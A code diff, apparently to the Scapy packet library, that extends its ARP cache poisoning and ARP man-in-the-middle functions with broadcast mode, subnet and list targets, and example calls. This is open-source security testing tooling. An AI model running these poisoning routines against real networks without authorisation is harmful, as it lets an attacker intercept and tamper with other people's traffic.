@@ -7,9 +7,10 @@
 Classes and functions for layer 2 protocols.
 """
 
+import itertools
+import socket
 import struct
 import time
-import socket
 
 from scapy.ansmachine import AnsweringMachine
 from scapy.arch import get_if_addr, get_if_hwaddr
@@ -65,6 +66,7 @@ from scapy.compat import (
     Any,
     Callable,
     Dict,
+    Iterable,
     List,
     Optional,
     Tuple,
@@ -731,17 +733,20 @@ conf.l3types.register(ETH_P_ARP, ARP)
 def arpcachepoison(
     target,  # type: Union[str, List[str]]
     addresses,  # type: Union[str, Tuple[str, str], List[Tuple[str, str]]]
+    broadcast=False,  # type: bool
     interval=15,  # type: int
 ):
     # type: (...) -> None
     """Poison targets' ARP cache
 
     :param target: Can be an IP, subnet (string) or a list of IPs. This lists the IPs
-                   or subnets that will be poisoned.
+                   or the subnet that will be poisoned.
     :param addresses: Can be either a string, a tuple of a list of tuples.
-                      If it's a string, it's the IP to usurpate in the victim,
+                      If it's a string, it's the IP to advertise to the victim,
                       with the local interface's MAC. If it's a tuple,
-                      it's ("IP", "MAC"). It it's a list, it's [("IP", "MAC")]
+                      it's ("IP", "MAC"). It it's a list, it's [("IP", "MAC")].
+                      "IP" can be a subnet of course.
+    :param broadcast: Use broadcast ethernet
 
     Examples for target "192.168.0.2"::
 
@@ -766,8 +771,9 @@ def arpcachepoison(
     else:
         couple_list = addresses
     p = [
-        Ether(src=y) / ARP(op="who-has", psrc=x, pdst=targets,
-                           hwsrc=y, hwdst="ff:ff:ff:ff:ff:ff")
+        Ether(src=y, dst="ff:ff:ff:ff:ff:ff" if broadcast else None) /
+        ARP(op="who-has", psrc=x, pdst=targets,
+            hwsrc=y, hwdst="00:00:00:00:00:00")
         for x, y in couple_list
     ]
     try:
@@ -782,19 +788,21 @@ def arpcachepoison(
 def arp_mitm(
     ip1,  # type: str
     ip2,  # type: str
-    mac1=None,  # type: Optional[str]
-    mac2=None,  # type: Optional[str]
+    mac1=None,  # type: Optional[Union[str, List[str]]]
+    mac2=None,  # type: Optional[Union[str, List[str]]]
+    broadcast=False,  # type: bool
     target_mac=None,  # type: Optional[str]
     iface=None,  # type: Optional[_GlobInterfaceType]
     inter=3,  # type: int
 ):
     # type: (...) -> None
-    """ARP MitM: poison 2 target's ARP cache
+    r"""ARP MitM: poison 2 target's ARP cache
 
     :param ip1: IPv4 of the first machine
     :param ip2: IPv4 of the second machine
     :param mac1: MAC of the first machine (optional: will ARP otherwise)
     :param mac2: MAC of the second machine (optional: will ARP otherwise)
+    :param broadcast: if True, will use broadcast mac for MitM by default
     :param target_mac: MAC of the attacker (optional: default to the interface's one)
     :param iface: the network interface. (optional: default, route for ip1)
 
@@ -805,33 +813,65 @@ def arp_mitm(
         $ sudo scapy
         >>> arp_mitm("192.168.122.156", "192.168.122.17")
 
+    Alternative usages:
+        >>> arp_mitm("10.0.0.1", "10.1.1.0/21", iface="eth1")
+        >>> arp_mitm("10.0.0.1", "10.1.1.2",
+        ...          target_mac="aa:aa:aa:aa:aa:aa",
+        ...          mac2="00:1e:eb:bf:c1:ab")
+
+    .. warning::
+        If using a subnet, this will first perform an arping, unless broadcast is on!
+
     Remember to change the sysctl settings back..
     """
     if not iface:
         iface = conf.route.route(ip1)[0]
     if not target_mac:
         target_mac = get_if_hwaddr(iface)
-    if mac1 is None:
-        mac1 = getmacbyip(ip1)
-        if not mac1:
-            print("Can't resolve mac for %s" % ip1)
-            return
-    if mac2 is None:
-        mac2 = getmacbyip(ip2)
-        if not mac2:
-            print("Can't resolve mac for %s" % ip2)
-            return
-    print("MITM on %s: %s <--> %s <--> %s" % (iface, mac1, target_mac, mac2))
+
+    def _tups(ip, mac):
+        # type: (str, Optional[Union[str, List[str]]]) -> Iterable[Tuple[str, str]]
+        if mac is None:
+            if broadcast:
+                # ip can be a Net/list/etc and will be iterated upon while sending
+                return [(ip, "ff:ff:ff:ff:ff:ff")]
+            return [(x.query.pdst, x.answer.hwsrc)
+                    for x in arping(ip, verbose=0)[0]]
+        elif isinstance(mac, list):
+            return [(ip, x) for x in mac]
+        else:
+            return [(ip, mac)]
+
+    tup1 = _tups(ip1, mac1)
+    if not tup1:
+        raise OSError(f"Could not resolve {ip1}")
+    tup2 = _tups(ip2, mac2)
+    if not tup2:
+        raise OSError(f"Could not resolve {ip2}")
+    print(f"MITM on {iface}: %s <--> {target_mac} <--> %s" % (
+        [x[1] for x in tup1],
+        [x[1] for x in tup2],
+    ))
     # We loop who-has requests
     srploop(
-        [
-            Ether(dst=mac1, src=target_mac) /
-            ARP(op="who-has", psrc=ip2, pdst=ip1,
-                hwsrc=target_mac, hwdst="ff:ff:ff:ff:ff:ff"),
-            Ether(dst=mac2, src=target_mac) /
-            ARP(op="who-has", psrc=ip1, pdst=ip2,
-                hwsrc=target_mac, hwdst="ff:ff:ff:ff:ff:ff")
-        ],
+        list(itertools.chain(
+            (x
+             for ipa, maca in tup1
+             for ipb, _ in tup2
+             for x in
+             Ether(dst=maca, src=target_mac) /
+             ARP(op="who-has", psrc=ipb, pdst=ipa,
+                 hwsrc=target_mac, hwdst="00:00:00:00:00:00")
+             ),
+            (x
+             for ipb, macb in tup2
+             for ipa, _ in tup1
+             for x in
+             Ether(dst=macb, src=target_mac) /
+             ARP(op="who-has", psrc=ipa, pdst=ipb,
+                 hwsrc=target_mac, hwdst="00:00:00:00:00:00")
+             ),
+        )),
         filter="arp and arp[7] = 2",
         inter=inter,
         iface=iface,
@@ -840,14 +880,27 @@ def arp_mitm(
         store=0,
     )
     print("Restoring...")
-    sendp([
-        Ether(dst=mac1, src=target_mac) /
-        ARP(op="who-has", psrc=ip2, pdst=ip1,
-            hwsrc=mac2, hwdst="ff:ff:ff:ff:ff:ff"),
-        Ether(dst=mac2, src=target_mac) /
-        ARP(op="who-has", psrc=ip1, pdst=ip2,
-            hwsrc=mac1, hwdst="ff:ff:ff:ff:ff:ff")
-    ], iface=iface)
+    sendp(
+        list(itertools.chain(
+            (x
+             for ipa, maca in tup1
+             for ipb, macb in tup2
+             for x in
+             Ether(dst=maca, src=macb) /
+             ARP(op="who-has", psrc=ipb, pdst=ipa,
+                 hwsrc=macb, hwdst="00:00:00:00:00:00")
+             ),
+            (x
+             for ipb, macb in tup2
+             for ipa, maca in tup1
+             for x in
+             Ether(dst=macb, src=maca) /
+             ARP(op="who-has", psrc=ipa, pdst=ipb,
+                 hwsrc=maca, hwdst="00:00:00:00:00:00")
+             ),
+        )),
+        iface=iface
+    )
 
 
 class ARPingResult(SndRcvList):
